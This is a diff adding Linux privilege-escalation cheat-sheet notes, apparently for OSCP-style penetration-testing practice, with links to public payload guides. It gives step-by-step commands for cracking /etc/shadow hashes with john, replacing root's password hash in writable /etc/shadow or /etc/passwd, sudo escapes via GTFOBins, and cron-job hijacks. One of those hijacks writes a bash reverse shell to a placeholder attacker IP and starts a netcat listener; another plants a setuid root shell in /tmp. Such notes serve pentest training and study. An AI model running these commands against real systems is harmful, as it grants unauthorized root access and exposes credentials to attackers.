@@ -3,3 +3,75 @@ Checklists:
   https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
   https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html
   https://payatu.com/guide-linux-privilege-escalation
+
+Readable /etc/shadow:
+  ls -l /etc/shadow
+  cat /etc/shadow
+                Each line of the file represents a user. A user's password hash (if they have one)
+                can be found between the first and second colons (:) of each line
+  john --wordlist=$ROCKYOU hash.txt
+  su root
+
+Writable /etc/shadow:
+  ls -l /etc/shadow
+  mkpasswd -m sha-512 newpasswordhere
+                Generate new password hash with a password of your choice
+  vim /etc/shadow
+                Edit the /etc/shadow file and replace the original root user's
+                epassword hash with the one you just generated
+  su root
+
+Writable /etc/passwd:
+  ls -l /etc/passwd
+                Some versions of Linux will still allow password hashes to be stored there
+  openssl passwd newpasswordhere
+                Generate a new password hash with a password of your choice
+  vim /etc/passwd
+                Edit the /etc/passwd file and place the generated password hash between the first 
+                and second colon (:) of the root user's row (replacing the "x")
+                Alternatively, copy the root user's row and append it to the bottom of the file, 
+                changing the first instance of the word "root" to "newroot" and placing the generated 
+                password hash between the first and second colon (replacing the "x").
+  su root
+
+Sudo - Shell Escape Sequences:
+  sudo -l       Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names.
+                If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+
+Cron Jobs - File Permissions:
+  cat /etc/crontab
+                View the contents of the system-wide crontab.
+  locate script.sh
+                Locate the full path of the script
+  ls -l /usr/local/bin/script.sh
+                Check if that the file is world-writable
+  echo '#!/bin/bash
+  bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1' > /usr/loca/bin/script.sh
+                Replace the contents of the script.sh file with the following after changing the IP address
+  nc -nvlp 4444
+                Set up a netcat listener on attacker machine and wait for the cron job to run
+
+Cron Jobs - PATH Environment Variable:
+  cat /etc/crontab
+                View the contents of the system-wide crontab, let's say the PATH
+                variable starts with /home/user
+  echo '#!/bin/bash
+  cp /bin/bash /tmp/rootbash
+  chmod +xs /tmp/rootbash' > overwrite.sh
+                Create a file called overwrite.sh in your home directory
+  chmod +x /home/user/overwrite.sh
+  /tmp/rootbash -p
+                Wait for the cron job to run and Run the /tmp/rootbash command with
+                -p to gain a shell running with root privileges
+
+
+Potential Privesc vectors to look out:
+  Service Exploits
+  Environment Variables
+  Cron Jobs - Wildcards
+  SUID / SGID Executables
+  Passwords & Keys - History Files
+  Passwords & Keys - Config Files
+  Passwords & Keys - SSH Keys
+  NFS
+  PrivEsc Scripts
